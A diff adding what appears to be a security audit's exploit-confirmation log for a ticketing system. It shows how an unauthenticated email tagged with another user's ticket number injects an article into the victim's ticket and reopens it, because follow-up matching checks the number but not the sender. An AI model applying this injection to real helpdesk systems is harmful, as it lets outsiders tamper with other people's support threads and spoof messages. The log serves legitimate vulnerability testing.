@@ -1,0 +1,12 @@
+==========================================================================
+VULN-006: Unauth email follow-up injects an article into an arbitrary ticket
+Target: http://localhost:25114
+[INFO] FollowUpCheck/Subject.pm:46 matches the ticket number; TicketCheckNumber checks existence, not sender
+==========================================================================
+[SETUP] victim ticket TID=81 TN=2026092910000809 (closed), 1 article(s)
+[STEP] piping an UNAUTHENTICATED (untrusted) email tagged [Ticket#2026092910000809] — no account, no X-OTRS
+[INFO] PostMaster::Read rc=0
+[PROOF] injected article on victim ticket: [['attacker_a6736705@evil.example', "UNAUTH-INJECTED-a6736705: content injected into someone else's ticket thread."], ['\\n']]
+[PROOF] victim article count 1 -> 2; state now: open
+[OK] exploit confirmed — an unauthenticated email tagged [Ticket#2026092910000809] appended the attacker's article (from attacker_a6736705@evil.example) to victim ticket 81 and reopened it (state now 'open') — follow-up matches the ticket number, never the sender.
+==> VULN-006: CONFIRMED — an unauthenticated email tagged [Ticket#2026092910000809] appended the attacker's article (from attacker_a6736705@evil.example) to victim ticket 81 and reopened it (state now 'open') — follow-up matches the ticket number, never the sender.
